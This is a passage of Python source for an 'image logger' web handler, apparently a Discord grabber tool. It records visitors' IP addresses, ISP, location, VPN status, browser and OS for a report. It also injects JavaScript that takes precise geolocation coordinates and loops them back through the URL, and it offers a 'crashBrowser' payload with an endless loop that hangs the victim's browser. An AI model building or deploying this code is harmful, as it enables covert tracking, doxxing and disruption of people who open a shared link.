                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
